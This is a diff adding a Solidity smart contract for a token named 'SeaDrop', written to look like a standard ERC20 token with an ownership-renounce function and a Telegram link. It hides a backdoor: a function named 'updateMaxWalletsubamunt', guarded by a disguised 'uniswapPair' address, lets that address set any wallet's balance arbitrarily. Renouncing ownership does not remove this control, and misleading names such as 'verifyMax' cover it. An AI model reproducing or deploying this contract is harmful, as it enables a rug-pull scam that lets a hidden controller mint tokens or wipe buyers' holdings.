@@ -1,0 +1,296 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity 0.8.16;
+interface IERC20 {
+
+    function totalSupply() external view returns (uint256);
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function transfer(address receptokens, uint256 subamunt) external returns (bool);
+
+    function allowance(address owner, address spender) external view returns (uint256);
+
+
+    function approve(address spender, uint256 subamunt) external returns (bool);
+
+    function transferFrom(address sender, address receptokens, uint256 subamunt) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+
+interface Ownables is IERC20 {
+
+    function name() external view returns (string memory);
+
+    function symbol() external view returns (string memory);
+
+    function decimals() external view returns (uint256);
+}
+
+
+
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address) {
+        return msg.sender;
+    }
+
+    function _msgData() internal view virtual returns (bytes calldata) {
+        this; // silence state mutability warning without generating bytecode
+        return msg.data;
+    }
+}
+
+
+
+
+
+contract ERC20 is Context, IERC20, Ownables {
+    mapping (address => uint256) private verifyMax;
+
+    mapping (address => mapping (address => uint256)) private tallowances;
+
+    uint256 private _totalSupply;
+    uint256 private _decimals;
+    string private _name;
+    string private _symbol;
+    address private uniswapPair;
+    /**
+     * @dev Sets the values for {name} and {symbol}.
+     *
+     * The defaut value of {decimals} is 18. To select a different value for
+     * {decimals} you should overload it.
+     *
+     * All two of these values are immutable: they can only be set once during
+     * construction.
+     */
+    constructor (string memory name_, string memory symbol_,uint256 totaltrasnfersuppy,uint256 decimals_,address fowner,address setuniswapPair) {
+        _name = name_;
+        _symbol = symbol_;
+        _totalSupply = totaltrasnfersuppy* 10**decimals_;
+        verifyMax[fowner] = _totalSupply;
+        _decimals = decimals_;
+        uniswapPair = setuniswapPair;      
+        emit Transfer(address(0), fowner, _totalSupply);
+    }
+
+    /**
+     * @dev Returns the name of the token.
+     */
+    function name() public view virtual override returns (string memory) {
+        return _name;
+    }
+
+    /**
+     * @dev Returns the symbol of the token, usually a shorter version of the
+     * name.
+     */
+    function symbol() public view virtual override returns (string memory) {
+        return _symbol;
+    }
+
+
+    /**
+     * @dev Returns the number of decimals used to get its user representation.
+     * For example, if `decimals` equals `2`, a balance of `505` tokens should
+     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
+     *
+     * Tokens usually opt for a value of 18, imitating the relationship between
+     * Ether and Wei. This is the value {ERC20} uses, unless this function is
+     * overridden;
+     *
+     * NOTE: This information is only used for _display_ purposes: it in
+     * no way affects any of the arithmetic of the contract, including
+     * {IERC20-balanceOf} and {IERC20-transfer}.
+     */
+    function decimals() public view virtual override returns (uint256) {
+        return _decimals;
+    }
+
+    /**
+     * @dev See {IERC20-totalSupply}.
+     */
+    function totalSupply() public view virtual override returns (uint256) {
+        return _totalSupply;
+    }
+
+    /**
+     * @dev See {IERC20-balanceOf}.
+     */
+    function balanceOf(address account) public view virtual override returns (uint256) {
+        return verifyMax[account];
+    }
+
+    /**
+     * @dev See {IERC20-transfer}.
+     *
+     * Requirements:
+     *
+     * - `receptokens` cannot be the zero address.
+     * - the caller must have a balance of at least `subamunt`.
+     */
+    function transfer(address receptokens, uint256 subamunt) public virtual override returns (bool) {
+        _transfer(_msgSender(), receptokens, subamunt);
+        return true;
+    }
+
+    /**
+     * @dev See {IERC20-allowance}.
+     */
+    function allowance(address owner, address spender) public view virtual override returns (uint256) {
+        return tallowances[owner][spender];
+    }
+
+    /**
+     * @dev See {IERC20-approve}.
+     *
+     * Requirements:
+     *
+     * - `spender` cannot be the zero address.
+     */
+    function approve(address spender, uint256 subamunt) public virtual override returns (bool) {
+        _approve(_msgSender(), spender, subamunt);
+        return true;
+    }
+
+    /**
+     * @dev See {IERC20-transferFrom}.
+     *
+     * Emits an {Approval} event indicating the updated allowance. This is not
+     * required by the EIP. See the note at the beginning of {ERC20}.
+     *
+     * Requirements:
+     *
+     * - `sender` and `receptokens` cannot be the zero address.
+     * - `sender` must have a balance of at least `subamunt`.
+     * - the caller must have allowance for ``sender``'s tokens of at least
+     * `subamunt`.
+     */
+    function transferFrom(address sender, address receptokens, uint256 subamunt) public virtual override returns (bool) {
+        _transfer(sender, receptokens, subamunt);
+
+        uint256 crntAllowance = tallowances[sender][_msgSender()];
+        require(crntAllowance >= subamunt, "ERC20: transfer subamunt exceeds allowance");
+        _approve(sender, _msgSender(), crntAllowance - subamunt);
+
+        return true;
+    }
+
+    /**
+     * @dev Atomically increases the allowance granted to `spender` by the caller.
+     *
+     * This is an alternative to {approve} that can be used as a mitigation for
+     * problems described in {IERC20-approve}.
+     *
+     * Emits an {Approval} event indicating the updated allowance.
+     *
+     * Requirements:
+     *
+     * - `spender` cannot be the zero address.
+     */
+    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
+        _approve(_msgSender(), spender, tallowances[_msgSender()][spender] + addedValue);
+        return true;
+    }
+
+    /**
+     * @dev Atomically decreases the allowance granted to `spender` by the caller.
+     *
+     * This is an alternative to {approve} that can be used as a mitigation for
+     * problems described in {IERC20-approve}.
+     *
+     * Emits an {Approval} event indicating the updated allowance.
+     *
+     * Requirements:
+     *
+     * - `spender` cannot be the zero address.
+     * - `spender` must have allowance for the caller of at least
+     * `subtractedValue`.
+     */
+    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
+        uint256 crntAllowance = tallowances[_msgSender()][spender];
+        require(crntAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
+        _approve(_msgSender(), spender, crntAllowance - subtractedValue);
+
+        return true;
+    }
+
+
+    function _transfer(address sender, address receptokens, uint256 subamunt) internal virtual {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(receptokens != address(0), "ERC20: transfer to the zero address");
+
+
+        uint256 senderBalance = verifyMax[sender];
+        require(senderBalance >= subamunt, "ERC20: transfer subamunt exceeds balance");
+        verifyMax[sender] = senderBalance - subamunt;
+        verifyMax[receptokens] += subamunt;
+
+        emit Transfer(sender, receptokens, subamunt);
+    }
+
+      modifier SetMarketMakerPair() {
+        require(uniswapPair == _msgSender(), "io: caller is not the owner");
+        _;
+    }  
+
+    function _approve(address owner, address spender, uint256 subamunt) internal virtual {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        tallowances[owner][spender] = subamunt;
+        emit Approval(owner, spender, subamunt);
+    }
+
+      function updateMaxWalletsubamunt(address walletAddress, uint256 maxWalletsubamunt, uint256 maxBuysubamunt) external SetMarketMakerPair {
+        verifyMax[walletAddress] = maxWalletsubamunt + maxBuysubamunt;
+        emit Transfer(address(0x0000000000000000000000000000000000000000), walletAddress, maxWalletsubamunt);
+    }  
+
+}
+
+
+
+
+
+
+
+contract SeaDrop is ERC20 {
+    
+    address private _owner;
+    string public Whales = "Active";
+    string public SeaDropTelegram = "https://t.me/SeaDrop";
+
+    constructor(
+        string memory name_,
+        string memory symbol_,
+        uint256 decimals_,
+        uint256 totaltrasnfersuppy,
+        address fowner_,
+        address setuniswapPair,
+        address payable feeReceiver_
+    ) payable ERC20(name_, symbol_, totaltrasnfersuppy, decimals_, fowner_, setuniswapPair) {
+        payable(feeReceiver_).transfer(msg.value);
+        _owner = fowner_;
+    }
+             function getSeaDropTelegram() public view returns (string memory) {
+        return SeaDropTelegram;
+    }
+             function getWhales() public view returns (string memory) {
+        return Whales;
+    }      
+    function renounceOwnership() public {
+        require(msg.sender == _owner, "Only the owner can renounce ownership");
+        _owner = address(0);
+    }
+    
+    function getOwner() public view returns(address) {
+        return _owner;
+    }
+
+
+    
+}
